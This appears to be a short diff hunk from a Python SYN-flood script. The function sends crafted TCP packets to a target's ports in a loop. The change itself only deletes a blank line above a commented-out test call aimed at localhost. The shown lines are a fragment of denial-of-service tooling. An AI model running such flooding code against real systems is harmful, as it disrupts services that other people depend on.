@@ -39,5 +39,4 @@ def SYN_Flood(targetIP, numPackets, ports):
             send(IP_Packet/TCP_Packet, verbose=0)
             print(f"Sent packet to {targetIP}:{port}")
 
-
 #SYN_Flood('127.0.0.1', 3, [123, 456])
